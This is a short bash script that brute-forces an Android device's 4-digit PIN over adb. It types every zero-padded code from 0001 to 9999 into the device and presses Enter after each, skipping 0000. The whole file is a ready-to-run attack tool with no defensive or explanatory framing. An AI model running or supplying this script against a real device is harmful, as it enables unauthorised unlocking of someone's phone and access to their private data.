#!/usr/bin/env bash

LENGTH=4 #define length of pin-code
ZERO='0'
PREFIX=''
MAX_COUNT=''
MAX_DIGIT='9'

for (( i=1; i <= $LENGTH; i++ ))
do
    PREFIX=$PREFIX$ZERO
    MAX_COUNT=$MAX_COUNT$MAX_DIGIT
done


for (( i=1; i <= $MAX_COUNT; i++ ))
do
    a=$PREFIX$i
    code=${a:${#a}-$LENGTH}
    echo $code

    #insert code
    adb shell input text $code

    #insert 'enter' 
    adb shell input keyevent 66
    adb shell input keyevent 66
done